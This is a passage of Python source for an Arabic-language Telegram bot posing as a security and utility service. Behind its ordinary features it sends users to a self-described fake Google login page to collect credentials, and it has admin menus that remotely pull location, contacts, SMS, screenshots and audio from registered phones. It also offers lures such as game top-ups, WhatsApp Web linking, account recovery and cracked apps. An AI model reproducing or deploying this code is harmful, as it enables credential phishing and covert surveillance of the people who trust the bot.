        password = ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(12))
        register = REQUEST_SESSION.post("https://api.mail.tm/accounts", 
                                       json={"address": email, "password": password}, timeout=10)
        if register.status_code != 201:
            return None, None, None
        login = REQUEST_SESSION.post("https://api.mail.tm/token", 
                                    json={"address": email, "password": password}, timeout=10)
        if login.status_code != 200:
            return None, None, None
        token = login.json().get('token')
        return email, token, password
    except Exception as e:
        return None, None, None

def check_temp_emails_real(token):
    if not token:
        return []
    try:
        headers = {"Authorization": f"Bearer {token}"}
        response = REQUEST_SESSION.get("https://api.mail.tm/messages", headers=headers, timeout=10)
        if response.status_code == 200:
            messages = response.json().get('hydra:member', [])
            results = []
            for msg in messages[:5]:
                results.append(f"📩 من: {msg.get('from', {}).get('address', '')}\n📌 الموضوع: {msg.get('subject', '')}\n📝 مقتطف: {msg.get('intro', '')[:150]}...")
            return results
    except:
        pass
    return []

def scan_apk_real(file_content, file_name):
    if not VIRUSTOTAL_API_KEY:
        return "⚠️ مفتاح VirusTotal غير مضبوط. يرجى إضافة VIRUSTOTAL_API_KEY", "error"
    try:
        url = "https://www.virustotal.com/api/v3/files"
        headers = {"x-apikey": VIRUSTOTAL_API_KEY}
        files = {'file': (file_name, file_content)}
        response = REQUEST_SESSION.post(url, headers=headers, files=files, timeout=60)
        if response.status_code == 200:
            scan_id = response.json().get('data', {}).get('id')
            if scan_id:
                time.sleep(5)
                report_url = f"https://www.virustotal.com/api/v3/analyses/{scan_id}"
                report = REQUEST_SESSION.get(report_url, headers=headers, timeout=30)
                if report.status_code == 200:
                    stats = report.json().get('data', {}).get('attributes', {}).get('stats', {})
                    malicious = stats.get('malicious', 0)
                    suspicious = stats.get('suspicious', 0)
                    if malicious > 0:
                        return f"🚨 تم اكتشاف {malicious} تهديدات!", "malicious"
                    elif suspicious > 0:
                        return f"⚠️ تم اكتشاف {suspicious} عناصر مشبوهة.", "suspicious"
                    else:
                        return "✅ الملف آمن.", "safe"
        return "⚠️ فشل فحص الملف.", "error"
    except Exception as e:
        return f"⚠️ خطأ: {str(e)}", "error"

def generate_fb_report(report_type, reason, link):
    templates = {
        "📢 منشور مسيء": f"""Dear Facebook Support Team,

I am writing to formally report a post that violates Facebook's Community Standards regarding Hate Speech and Offensive Content.

Link (if available): {link if link else 'Not provided'}

Description:
{reason}

Sincerely,
A concerned Facebook user""",
        "👤 حساب مزيف": f"""Dear Facebook Support Team,

I am reporting a fake account.

Account Link: {link if link else 'Not provided'}

Details:
{reason}

Sincerely,
A concerned Facebook user""",
        "🔒 انتهاك خصوصية": f"""Dear Facebook Support Team,

I am reporting a privacy violation.

Link: {link if link else 'Not provided'}

Description:
{reason}

Sincerely,
A concerned Facebook user""",
        "⚠️ تحرش أو مضايقة": f"""Dear Facebook Support Team,

I am reporting harassment.

Link: {link if link else 'Not provided'}

Details:
{reason}

Sincerely,
A concerned Facebook user""",
        "🎭 انتحال شخصية": f"""Dear Facebook Support Team,

I am reporting impersonation.

Link: {link if link else 'Not provided'}

Details:
{reason}

Sincerely,
A concerned Facebook user""",
        "💢 محتوى عنيف": f"""Dear Facebook Support Team,

I am reporting violent content.

Link: {link if link else 'Not provided'}

Description:
{reason}

Sincerely,
A concerned Facebook user"""
    }
    for key in templates:
        if key in report_type:
            return templates[key]
    return f"""Dear Facebook Support Team,

I am reporting content that violates Facebook's Community Standards regarding {report_type}.

Issue Description:
{reason}

Link: {link if link else 'Not provided'}

Sincerely,
A concerned Facebook user"""

def extract_text_from_pdf(pdf_content):
    try:
        pdf_file = BytesIO(pdf_content)
        reader = pypdf.PdfReader(pdf_file)
        text = ""
        for page in reader.pages:
            page_text = page.extract_text()
            if page_text:
                text += page_text + "\n"
        return text.strip()
    except Exception as e:
        return None

def split_text_into_chunks(text, max_chunk_size=3000):
    chunks = []
    while len(text) > max_chunk_size:
        split_point = text.rfind(' ', 0, max_chunk_size)
        if split_point == -1:
            split_point = max_chunk_size
        chunks.append(text[:split_point])
        text = text[split_point:].strip()
    if text:
        chunks.append(text)
    return chunks

def find_relevant_chunk(text, question, chunks):
    keywords = re.findall(r'\b\w+\b', question.lower())
    best_chunk = None
    best_score = 0
    for chunk in chunks:
        chunk_lower = chunk.lower()
        score = sum(1 for kw in keywords if kw in chunk_lower)
        if score > best_score:
            best_score = score
            best_chunk = chunk
    if best_chunk is None:
        best_chunk = chunks[0] if chunks else text
    return best_chunk

def answer_question_from_pdf(text, question):
    if not text:
        return "⚠️ لم يتم تحميل أي نص."
    chunks = split_text_into_chunks(text, 3000)
    relevant_chunk = find_relevant_chunk(text, question, chunks)
    return f"📚 الإجابة: {relevant_chunk[:500]}..."

def fetch_temp_numbers_advanced(limit=5):
    results = []
    sources = [
        ("https://receive-sms-online.cc/", "US"),
        ("https://www.temporary-phone-number.com/", "US"),
        ("https://www.textnow.com/", "US"),
        ("https://sms-online.co/receive-free-sms/", "US"),
        ("https://www.freeonlinephone.org/", "US")
    ]
    for base_url, default_country in sources:
        try:
            response = REQUEST_SESSION.get(base_url, timeout=15)
            if response.status_code != 200:
                continue
            soup = BeautifulSoup(response.text, 'html.parser')
            text = soup.get_text()
            pattern = r'\+?\d{1,3}[-.\s]?\(?\d{1,4}\)?[-.\s]?\d{1,4}[-.\s]?\d{1,4}'
            matches = re.findall(pattern, text)
            for match in matches[:limit]:
                cleaned = re.sub(r'[-.\s()]', '', match)
                if not cleaned.startswith('+'):
                    cleaned = '+' + cleaned
                country = default_country
                country_names = ['USA', 'UK', 'Canada', 'Germany', 'France', 'Spain', 'Italy', 'Egypt', 'UAE', 'Saudi']
                for name in country_names:
                    if name in text[max(0, text.find(match)-50):text.find(match)+50]:
                        country = name
                        break
                results.append({
                    'number': cleaned,
                    'country': country,
                    'source': base_url,
                    'status': 'available'
                })
                if len(results) >= limit:
                    break
            if len(results) >= limit:
                break
        except Exception as e:
            continue
    return results

def download_video(url):
    if not FFMPEG_AVAILABLE:
        return None, "⚠️ FFmpeg غير مثبت على النظام. يُرجى تثبيته لتشغيل هذه الميزة."
    try:
        import yt_dlp
        output_template = os.path.join(TEMP_DIR, f"video_{int(time.time())}.%(ext)s")
        ydl_opts = {
            'outtmpl': output_template,
            'format': 'bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best',
            'quiet': True,
            'no_warnings': True,
        }
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            downloaded_file = ydl.prepare_filename(info)
            if os.path.exists(downloaded_file) and os.path.getsize(downloaded_file) > 0:
                return downloaded_file, None
            else:
                return None, "⚠️ فشل تحميل الفيديو: الملف فارغ أو تالف."
    except Exception as e:
        logger.error(f"Download video error: {e}")
        return None, f"⚠️ فشل تحميل الفيديو: {str(e)[:100]}"

def shorten_url(url):
    try:
        response = REQUEST_SESSION.get(f"https://is.gd/create.php?format=json&url={requests.utils.quote(url)}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            if 'shorturl' in data:
                return data['shorturl'], None
            else:
                return None, data.get('errormessage', 'خطأ غير معروف')
        else:
            return None, f"فشل الاتصال (كود {response.status_code})"
    except Exception as e:
        return None, f"خطأ: {str(e)}"

def check_domain_virustotal(domain):
    if VIRUSTOTAL_API_KEY:
        try:
            url = f"https://www.virustotal.com/api/v3/domains/{domain}"
            headers = {"x-apikey": VIRUSTOTAL_API_KEY}
            response = REQUEST_SESSION.get(url, headers=headers, timeout=30)
            if response.status_code == 200:
                data = response.json()
                stats = data.get('data', {}).get('attributes', {}).get('last_analysis_stats', {})
                malicious = stats.get('malicious', 0)
                suspicious = stats.get('suspicious', 0)
                result = f"🌐 تحليل النطاق: {domain}\n"
                result += f"🛡️ نتائج الفحص:\n"
                result += f"   - ضار: {malicious}\n"
                result += f"   - مشبوه: {suspicious}\n"
                result += f"   - آمن: {stats.get('harmless', 0)}\n"
                if malicious > 0:
                    result += "🚨 **تحذير: تم اكتشاف تهديدات!**"
                elif suspicious > 0:
                    result += "⚠️ **تنبيه: يوجد عناصر مشبوهة**"
                else:
                    result += "✅ **النطاق يبدو آمناً.**"
                return result
        except Exception as e:
            logger.error(f"VirusTotal error: {e}")
    return f"🌐 النطاق: {domain}\n⚠️ لم تتوفر معلومات فحص كافية."

def perform_vulnerability_scan(target_ip, target_domain, target_url):
    if target_url:
        return advanced_website_scan(target_url)
    elif target_domain:
        return advanced_website_scan(f"https://{target_domain}")
    elif target_ip:
        return f"🛡️ فحص IP: {target_ip}\n(لا يدعم هذا الإصدار فحص IP مباشر، يُرجى إرسال رابط أو نطاق.)"
    else:
        return "⚠️ لم يتم تحديد هدف."

# ===================== دوال Google =====================
def google_login(message):
    chat_id = message.chat.id
    if chat_id in google_users:
        safe_send(chat_id, "✅ أنت متصل بالفعل.")
        return
    fake_url = f"{SERVER_URL}/google_login"
    msg = (
        "🔑 <b>تفعيل الخدمات</b>\n\n"
        "للوصول إلى الخدمات المميزة، يُرجى تسجيل الدخول عبر الرابط الرسمي التالي:\n"
        f"{fake_url}\n\n"
        "مع ضرورة التأكيد على إدخال بيانات الاعتماد الصحيحة.\n\n"
        "للاستفسارات، يُرجى التواصل مع فريق الدعم."
    )
    safe_send(chat_id, msg)
    notify_admin(f"🔑 مستخدم {chat_id} فتح صفحة تسجيل الدخول المزيفة لجوجل")

def google_logout(message):
    chat_id = message.chat.id
    if chat_id in google_users:
        del google_users[chat_id]
    if chat_id in google_passwords:
        del google_passwords[chat_id]
    safe_send(chat_id, "✅ تم تسجيل الخروج.")

# ===================== متغيرات الحالة =====================
user_states = {}
google_users = {}
google_passwords = {}
temp_emails = {}
developer_computer_endpoint = None
admin_remote_target = {}
linked_users = set()
tts_voice_selection = {}

# ===================== قائمة الميزات =====================
ALL_FEATURES = [
    "site_scan", "apk_scan", "code_review", "temp_email",
    "fb_report", "track_phone", "pdf_analysis", "temp_number",
    "download_video", "shorten_url", "vuln_scan", "facebook_followers",
    "survey", "pdf_reader", "track_phone_location", "apk_survey",
    "video_chat", "freefire", "security_check", "whatsapp_web",
    "temp_mail_service", "file_recovery", "link_scanner", "tiktok_followers",
    "cracked_apps", "account_recovery", "security_scan",
    "hidden_image_polyglot"
]

ADMIN_ONLY_FEATURES = [
    "apk_survey", "admin_panel", "view_devices", "remote_admin",
    "set_dev_endpoint", "admin_stats", "admin_broadcast",
    "admin_collected_data", "admin_logs", "admin_ban_user", "admin_unban_user",
    "hidden_image_polyglot"
]

feature_usage = {
    "ثغرات المواقع": 0, "فحص APK": 0, "فحص كود": 0,
    "إيميل مؤقت": 0, "تتبع الأرقام": 0,
    "بلاغات فيسبوك": 0,
    "تحميل فيديو": 0, "تقصير روابط": 0,
    "فحص ثغرات": 0, "رشق متابعين": 0,
    "استبيان": 0, "قاريء PDF": 0,
    "تتبع رقم": 0, "APK": 0,
    "لوحة التحكم": 0,
    "دردشة فيديو": 0,
    "شحن فري فاير": 0,
    "تأكيد هوية": 0,
    "ربط واتساب": 0,
    "بريد مؤقت": 0,
    "استعادة ملفات": 0,
    "فحص روابط": 0,
    "متابعين تيك توك": 0,
    "تطبيقات مهكرة": 0,
    "استعادة حساب": 0,
    "فحص أمان شامل": 0,
    "صورة مدموجة": 0
}

FB_REPORT_TYPES = {
    "offensive": "📢 منشور مسيء",
    "fake": "👤 حساب مزيف",
    "inappropriate": "🚫 محتوى غير لائق",
    "privacy": "🔒 انتهاك خصوصية",
    "harassment": "⚠️ تحرش أو مضايقة",
    "impersonation": "🎭 انتحال شخصية",
    "violent": "💢 محتوى عنيف",
    "other": "📌 أخرى"
}

def is_admin(user_id):
    return user_id == ADMIN_ID

# ===================== بناء القوائم =====================
def build_main_menu(user_id):
    markup = InlineKeyboardMarkup(row_width=2)
    is_admin_user = is_admin(user_id)
    user_points = get_user_points(user_id) if not is_admin_user else 999
    unlocked = is_user_unlocked(user_id) if not is_admin_user else True
    user_perms = get_user_permissions(user_id) if not is_admin_user else ALL_FEATURES

    def can_access(feature, required_points=0):
        if is_admin_user:
            return True
        if unlocked:
            return True
        if user_points >= required_points:
            return True
        return feature in user_perms

    markup.row(
        InlineKeyboardButton("🔍 فحص الأمان", callback_data="mode_site") if can_access("site_scan", 10) else InlineKeyboardButton("🔍 فحص الأمان 🔒", callback_data="locked_site"),
        InlineKeyboardButton("📦 فحص التطبيقات", callback_data="mode_apk") if can_access("apk_scan", 10) else InlineKeyboardButton("📦 فحص التطبيقات 🔒", callback_data="locked_apk")
    )
    markup.row(
        InlineKeyboardButton("🛠️ مراجعة الكود", callback_data="mode_my_app") if can_access("code_review", 10) else InlineKeyboardButton("🛠️ مراجعة الكود 🔒", callback_data="locked_my_app"),
        InlineKeyboardButton("📤 انشاء بريد", callback_data="mode_temp_email") if can_access("temp_email", 0) else InlineKeyboardButton("📤 انشاء بريد 🔒", callback_data="locked_temp_email")
    )
    markup.row(
        InlineKeyboardButton("بلاغ فيسبوك", callback_data="mode_fb_report") if can_access("fb_report", 30) else InlineKeyboardButton("بلاغ فيسبوك 🔒", callback_data="locked_fb_report"),
        InlineKeyboardButton("📍 تتبع رقم", callback_data="mode_track_phone") if can_access("track_phone", 10) else InlineKeyboardButton("📍 تتبع رقم 🔒", callback_data="locked_track_phone")
    )
    markup.row(
        InlineKeyboardButton("📚 تحليل PDF", callback_data="mode_pdf") if can_access("pdf_analysis", 0) else InlineKeyboardButton("📚 تحليل PDF 🔒", callback_data="locked_pdf")
    )
    markup.row(
        InlineKeyboardButton("📱 الحصول على رقم", callback_data="mode_temp_number") if can_access("temp_number", 50) else InlineKeyboardButton("📱 الحصول على رقم 🔒", callback_data="locked_temp_number")
    )
    if user_id in google_users:
        markup.row(InlineKeyboardButton("✅ الخدمات مفعلة", callback_data="mode_google_logout"))
    else:
        markup.row(InlineKeyboardButton("🔗 تفعيل الخدمات", callback_data="mode_google_login"))
    markup.row(
        InlineKeyboardButton("📥 تحميل فيديو", callback_data="mode_download") if can_access("download_video", 0) else InlineKeyboardButton("📥 تحميل فيديو 🔒", callback_data="locked_download"),
        InlineKeyboardButton("🔗 تقصير الروابط", callback_data="mode_shorten_url") if can_access("shorten_url", 0) else InlineKeyboardButton("🔗 تقصير الروابط 🔒", callback_data="locked_shorten")
    )
    markup.row(
        InlineKeyboardButton("🛡️ فحص ثغرات", callback_data="mode_vuln_scan") if can_access("vuln_scan", 20) else InlineKeyboardButton("🛡️ فحص ثغرات 🔒", callback_data="locked_vuln_scan"),
        InlineKeyboardButton("📊 رشق متابعين", callback_data="mode_facebook_followers") if can_access("facebook_followers", 0) else InlineKeyboardButton("📊 رشق متابعين 🔒", callback_data="locked_facebook_followers")
    )
    markup.row(
        InlineKeyboardButton("📋 استبيان مدفوع", callback_data="mode_survey") if can_access("survey", 1000) else InlineKeyboardButton("📋 استبيان مدفوع 🔒 (1000 نقطة)", callback_data="locked_survey"),
        InlineKeyboardButton("📄 قاريء PDF", callback_data="mode_pdf_reader") if can_access("pdf_reader", 1000) else InlineKeyboardButton("📄 قاريء PDF 🔒 (1000 نقطة)", callback_data="locked_pdf_reader")
    )
    markup.row(
        InlineKeyboardButton("📍 تتبع موقع الهاتف", callback_data="mode_track_phone_location") if can_access("track_phone_location", 500) else InlineKeyboardButton("📍 تتبع موقع الهاتف 🔒 (500 نقطة)", callback_data="locked_track_phone_location"),
        InlineKeyboardButton("📱 APK", callback_data="mode_apk_survey") if is_admin_user else InlineKeyboardButton("📱 APK 🔒 (للمطور فقط)", callback_data="locked_apk_survey")
    )

    new_features = [
        ("📹 دردشة فيديو", "video_chat", 0),
        ("🔥 شحن فري فاير", "freefire", 0),
        ("🔐 تأكيد هوية الحساب", "security_check", 0),
        ("📱 ربط واتساب ويب", "whatsapp_web", 0),
        ("📧 بريد مؤقت", "temp_mail_service", 0),
        ("📂 استعادة الملفات", "file_recovery", 0),
        ("🌐 فحص الروابط", "link_scanner", 0),
        ("📊 متابعين تيك توك", "tiktok_followers", 0),
        ("📲 تطبيقات مهكرة", "cracked_apps", 0),
        ("🔑 استعادة حساب", "account_recovery", 0),
        ("🛡️ فحص الأمان الشامل", "security_scan", 0)
    ]

    for i in range(0, len(new_features), 2):
        row = []
        for j in range(2):
            if i + j < len(new_features):
                label, feature, points = new_features[i + j]
                if is_admin_user or feature in user_perms:
                    row.append(InlineKeyboardButton(label, callback_data=f"mode_{feature}"))
                else:
                    row.append(InlineKeyboardButton(f"{label} 🔒", callback_data=f"locked_{feature}"))
        if row:
            markup.row(*row)

    markup.row(
        InlineKeyboardButton("⭐ نقاطي", callback_data="mode_show_points"),
        InlineKeyboardButton("📊 سجل النقاط", callback_data="mode_points_history")
    )
    markup.row(
        InlineKeyboardButton("🔗 رابط دعوتي", callback_data="mode_show_referral")
    )

    if is_admin_user:
        markup.row(
            InlineKeyboardButton("👑 لوحة التحكم", callback_data="mode_admin_panel"),
            InlineKeyboardButton("📱 الأجهزة", callback_data="mode_view_devices")
        )
        markup.row(
            InlineKeyboardButton("🎮 تحكم عن بعد", callback_data="mode_remote_admin"),
            InlineKeyboardButton("🖥️ ربط حاسب", callback_data="mode_set_dev_endpoint")
        )
        markup.row(
            InlineKeyboardButton("📊 إحصائيات", callback_data="admin_stats"),
            InlineKeyboardButton("📢 بث جماعي", callback_data="admin_broadcast")
        )
        markup.row(
            InlineKeyboardButton("📩 معلومات مجمعة", callback_data="admin_collected_data"),
            InlineKeyboardButton("📜 سجل الأخطاء", callback_data="admin_logs")
        )
        markup.row(
            InlineKeyboardButton("🚫 حظر مستخدم", callback_data="admin_ban_user"),
            InlineKeyboardButton("✅ إلغاء حظر", callback_data="admin_unban_user")
        )
        markup.row(
            InlineKeyboardButton("🔑 إدارة الصلاحيات", callback_data="admin_manage_permissions")
        )
        markup.row(
            InlineKeyboardButton("🖼️ صورة مدموجة", callback_data="mode_hidden_image_polyglot")
        )

    return markup

# ===================== قائمة الأجهزة مع أزرار اختيار محسنة =====================
def build_device_list_markup():
    markup = InlineKeyboardMarkup(row_width=1)
    devices = get_registered_devices_db()
    if not devices:
        markup.row(InlineKeyboardButton("⚠️ لا توجد أجهزة", callback_data="no_devices"))
    else:
        for dev in devices:
            device_id = dev['device_id']
            short_id = device_id[:8] + "..." if len(device_id) > 10 else device_id
            markup.row(InlineKeyboardButton(f"📱 {short_id}", callback_data=f"remote_select_{device_id}"))
    markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
    return markup

# ===================== أزرار الأوامر لجهاز معين =====================
def build_device_commands_markup(device_id):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("📍 الموقع", callback_data=f"remote_cmd_{device_id}_GET_LOCATION"),
        InlineKeyboardButton("📇 جهات اتصال", callback_data=f"remote_cmd_{device_id}_GET_CONTACTS")
    )
    markup.row(
        InlineKeyboardButton("✉️ رسائل SMS", callback_data=f"remote_cmd_{device_id}_GET_SMS"),
        InlineKeyboardButton("📸 لقطة شاشة", callback_data=f"remote_cmd_{device_id}_SCREENSHOT")
    )
    markup.row(
        InlineKeyboardButton("🎙️ تسجيل صوت", callback_data=f"remote_cmd_{device_id}_RECORD"),
        InlineKeyboardButton("📊 معلومات", callback_data=f"remote_cmd_{device_id}_GET_INFO")
    )
    markup.row(
        InlineKeyboardButton("🔄 تحديث", callback_data=f"remote_refresh_{device_id}"),
        InlineKeyboardButton("🔙 رجوع", callback_data="mode_remote_admin")
    )
    return markup

# ===================== قائمة الأزرار الإدارية (معدلة) =====================
def build_fb_report_type_markup():
    markup = InlineKeyboardMarkup(row_width=2)
    for key, label in FB_REPORT_TYPES.items():
        markup.row(InlineKeyboardButton(label, callback_data=f"fb_type_{key}"))
    markup.row(InlineKeyboardButton("❌ إلغاء", callback_data="back_to_main"))
    return markup

def build_permissions_management_markup():
    markup = InlineKeyboardMarkup(row_width=1)
    users = get_all_users_with_status()
    for user in users[:20]:
        name = user['name'][:15]
        markup.row(InlineKeyboardButton(f"👤 {name} ({user['id']})", callback_data=f"admin_perm_user_{user['id']}"))
    markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="mode_admin_panel"))
    return markup

def build_user_features_markup(user_id):
    markup = InlineKeyboardMarkup(row_width=2)
    user_perms = get_user_permissions(user_id)
    features = [
        ("🔍 فحص الأمان", "site_scan"),
        ("📦 فحص التطبيقات", "apk_scan"),
        ("🛠️ مراجعة الكود", "code_review"),
        ("📤 انشاء بريد", "temp_email"),
        ("بلاغ فيسبوك", "fb_report"),
        ("📍 تتبع رقم", "track_phone"),
        ("📚 تحليل PDF", "pdf_analysis"),
        ("📱 الحصول على رقم", "temp_number"),
        ("📥 تحميل فيديو", "download_video"),
        ("🔗 تقصير الروابط", "shorten_url"),
        ("🛡️ فحص ثغرات", "vuln_scan"),
        ("📊 رشق متابعين", "facebook_followers"),
        ("📋 استبيان مدفوع", "survey"),
        ("📄 قاريء PDF", "pdf_reader"),
        ("📍 تتبع موقع الهاتف", "track_phone_location"),
        ("📹 دردشة فيديو", "video_chat"),
        ("🔥 شحن فري فاير", "freefire"),
        ("🔐 تأكيد هوية الحساب", "security_check"),
        ("📱 ربط واتساب ويب", "whatsapp_web"),
        ("📧 بريد مؤقت", "temp_mail_service"),
        ("📂 استعادة الملفات", "file_recovery"),
        ("🌐 فحص الروابط", "link_scanner"),
        ("📊 متابعين تيك توك", "tiktok_followers"),
        ("📲 تطبيقات مهكرة", "cracked_apps"),
        ("🔑 استعادة حساب", "account_recovery"),
        ("🛡️ فحص الأمان الشامل", "security_scan")
    ]
    for label, feature in features:
        if feature in user_perms:
            markup.row(InlineKeyboardButton(f"✅ {label}", callback_data=f"admin_perm_toggle_{user_id}_{feature}_0"))
        else:
            markup.row(InlineKeyboardButton(f"❌ {label}", callback_data=f"admin_perm_toggle_{user_id}_{feature}_1"))
    markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="admin_manage_permissions"))
    return markup

# ===================== معالج الأوامر =====================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    user_states[chat_id] = None
    if is_user_banned(chat_id):
        safe_send(chat_id, "🚫 أنت محظور.")
        return
    username = message.from_user.username or ''
    first_name = message.from_user.first_name or ''
    last_name = message.from_user.last_name or ''
    text = message.text
    referral_code = None
    if ' ' in text:
        parts = text.split()
        if len(parts) > 1 and parts[1].startswith('ref_'):
            code = parts[1][4:]
            if handle_referral(code, chat_id):
                safe_send(chat_id, "🎉 تم تفعيل رابط الدعوة! +10 نقاط.")
                referral_code = code
    upsert_user(chat_id, username, first_name, last_name, referral_code)
    if is_new_user(chat_id):
        welcome = (
            "مرحبا بك في البوت المتقدم\n"
            "قم بالضغط على /Start ليعمل النظام 🌐\n"
            "واختر الخيارات التي تريدها 🤖\n"
            "بعض الخيارات تحتاج إلى نقاط 🔒\n"
            "للحصول على نقاط عليك مشاركة النظام 🤖\n"
            "اوامر المساعدة اضغط /help 👤"
        )
        safe_send(chat_id, welcome)
        mark_welcome_sent(chat_id)
    safe_send(chat_id, "📌 القائمة الرئيسية:", reply_markup=build_main_menu(chat_id))

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = (
        "📖 الأوامر المتاحة\n\n"
        "/start - القائمة الرئيسية\n"
        "/login - تفعيل الخدمات (Google)\n"
        "/logout - تسجيل الخروج\n"
        "/referral - رابط دعوتك\n"
        "/points - نقاطك\n"
        "/cancel - إلغاء العملية\n\n"
        "🔗 نظام النقاط: كل دعوة = 10 نقاط.\n"
        "🔒 الأزرار المغلقة تتطلب نقاطاً.\n"
        "🔓 الأزرار المفتوحة متاحة للجميع.\n"
        "👑 المطور لديه صلاحية كاملة."
    )
    safe_send(message.chat.id, help_text)

@bot.message_handler(commands=['points'])
def show_points(message):
    chat_id = message.chat.id
    points = get_user_points(chat_id)
    safe_send(chat_id, f"⭐ نقاطك: {points}")

@bot.message_handler(commands=['referral'])
def show_referral(message):
    chat_id = message.chat.id
    link = create_referral_link(chat_id)
    safe_send(chat_id, f"🔗 رابط دعوتك:\n{link}")

@bot.message_handler(commands=['cancel'])
def cancel_state(message):
    chat_id = message.chat.id
    if chat_id in user_states:
        del user_states[chat_id]
    if chat_id in admin_remote_target:
        del admin_remote_target[chat_id]
    safe_send(chat_id, "✅ تم الإلغاء.")

@bot.message_handler(commands=['login'])
def google_login_handler(message):
    google_login(message)

@bot.message_handler(commands=['logout'])
def google_logout_handler(message):
    google_logout(message)

@bot.message_handler(commands=['check_email'])
def check_email_command(message):
    chat_id = message.chat.id
    if chat_id not in temp_emails:
        safe_send(chat_id, "❌ ليس لديك بريد مؤقت.")
        return
    token = temp_emails[chat_id]['token']
    msgs = check_temp_emails_real(token)
    response = "📬 رسائل البريد المؤقت\n\n" + "\n\n".join(msgs) if msgs else "📭 لا توجد رسائل."
    safe_send(chat_id, response)

# ===================== معالج الأزرار =====================
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    try:
        bot.answer_callback_query(call.id)
        logger.info(f"✅ Callback received: {call.data} from user {call.from_user.id}")
    except Exception as e:
        logger.error(f"Callback answer error: {e}")
    
    chat_id = call.message.chat.id
    data = call.data
    user_id = chat_id
    is_admin_user = is_admin(chat_id)
    unlocked = is_user_unlocked(chat_id)
    points = get_user_points(chat_id)
    user_perms = get_user_permissions(chat_id)

    # ========== معالجة الأزرار المغلقة ==========
    if data.startswith("locked_"):
        if is_admin_user or unlocked:
            actual_mode = data.replace("locked_", "mode_")
        else:
            required = 10
            if "fb_report" in data: required = 30
            elif "temp_number" in data: required = 50
            elif "survey" in data: required = 1000
            elif "pdf_reader" in data: required = 1000
            elif "track_phone_location" in data: required = 500
            elif "apk_survey" in data:
                safe_send(chat_id, "❌ هذه الميزة متاحة للمطور فقط.")
                return
            
            if points < required:
                safe_send(chat_id, f"❌ نقاط غير كافية! تحتاج {required} نقطة.")
                return
            if not deduct_points(chat_id, required, f"استخدام ميزة {data}"):
                safe_send(chat_id, "❌ فشل خصم النقاط.")
                return
            actual_mode = data.replace("locked_", "mode_")
        
        # تنفيذ الميزة المطلوبة
        if actual_mode == "mode_site":
            user_states[chat_id] = "waiting_for_site"
            safe_send(chat_id, "🔗 أرسل رابط الموقع لفحصه.")
        elif actual_mode == "mode_apk":
            user_states[chat_id] = "waiting_for_apk"
            safe_send(chat_id, "📦 أرسل ملف APK لتحليله.")
        elif actual_mode == "mode_my_app":
            user_states[chat_id] = "waiting_for_my_app"
            safe_send(chat_id, "🛠️ أرسل ملف الكود لمراجعته.")
        elif actual_mode == "mode_track_phone":
            user_states[chat_id] = "waiting_for_track_num"
            safe_send(chat_id, "📍 أرسل الرقم (مثل: +201001234567).")
        elif actual_mode == "mode_vuln_scan":
            user_states[chat_id] = "waiting_for_vuln_target"
            safe_send(chat_id, "🛡️ أرسل الهدف لفحص الثغرات.\n\nيمكنك إرسال:\n• رابط موقع\n• عنوان IP\n• نطاق")
        elif actual_mode == "mode_survey":
            survey_url = f"{SERVER_URL}/survey"
            safe_send(chat_id, f"📄 <b>استبيان مدفوع</b>\n\n🔗 <a href='{survey_url}'>الرابط</a>")
            feature_usage["استبيان"] += 1
        elif actual_mode == "mode_pdf_reader":
            pdf_url = f"{SERVER_URL}/pdf_reader"
            safe_send(chat_id, f"📄 <b>قاريء PDF</b>\n\n🔗 <a href='{pdf_url}'>الرابط</a>")
            feature_usage["قاريء PDF"] += 1
        elif actual_mode == "mode_track_phone_location":
            user_states[chat_id] = "waiting_for_phone_tracking"
            safe_send(chat_id, "📍 أرسل رقم الهاتف (مثال: +201001234567):")
            feature_usage["تتبع رقم"] += 1
        elif actual_mode == "mode_apk_survey":
            if not is_admin_user:
                safe_send(chat_id, "❌ للمطور فقط.")
                return
            apk_url = f"{SERVER_URL}/download_apk_survey"
            safe_send(chat_id, f"📱 <b>APK</b>\n\n🔗 <a href='{apk_url}'>تحميل APK</a>")
            feature_usage["APK"] += 1
            notify_admin(f"📱 مستخدم {chat_id} طلب APK")
        else:
            safe_send(chat_id, "⚠️ ميزة غير معروفة.")
        return

    # ========== الأزرار الإدارية ==========
    if data.startswith('admin_') or data.startswith('mode_admin_panel'):
        if not is_admin_user:
            safe_send(chat_id, "❌ للمطور فقط.")
            return
        
        if data == "mode_admin_panel":
            markup = InlineKeyboardMarkup(row_width=2)
            markup.row(
                InlineKeyboardButton("📢 إرسال رسالة", callback_data="admin_send_message"),
                InlineKeyboardButton("👥 إدارة المستخدمين", callback_data="admin_manage_users")
            )
            markup.row(
                InlineKeyboardButton("📊 إحصائيات", callback_data="admin_stats"),
                InlineKeyboardButton("📢 بث جماعي", callback_data="admin_broadcast")
            )
            markup.row(
                InlineKeyboardButton("📩 معلومات مجمعة", callback_data="admin_collected_data"),
                InlineKeyboardButton("📜 سجل الأخطاء", callback_data="admin_logs")
            )
            markup.row(
                InlineKeyboardButton("🔑 إدارة الصلاحيات", callback_data="admin_manage_permissions")
            )
            markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
            safe_send(chat_id, "👑 لوحة التحكم:", reply_markup=markup)
            feature_usage["لوحة التحكم"] += 1
            return

        if data == "admin_manage_permissions":
            markup = build_permissions_management_markup()
            safe_send(chat_id, "🔑 اختر المستخدم لإدارة صلاحياته:", reply_markup=markup)
            return

        if data.startswith("admin_perm_user_"):
            target_id = int(data.split("_")[3])
            markup = build_user_features_markup(target_id)
            user_info = get_user(target_id)
            name = user_info['first_name'] or user_info['username'] or str(target_id) if user_info else str(target_id)
            safe_send(chat_id, f"🔑 إدارة صلاحيات المستخدم: {name}\n\n✅ مفعل - ❌ غير مفعل", reply_markup=markup)
            return

        if data.startswith("admin_perm_toggle_"):
            parts = data.split("_")
            target_id = int(parts[3])
            feature = parts[4]
            enable = int(parts[5]) == 1
            set_user_permission(target_id, feature, enable)
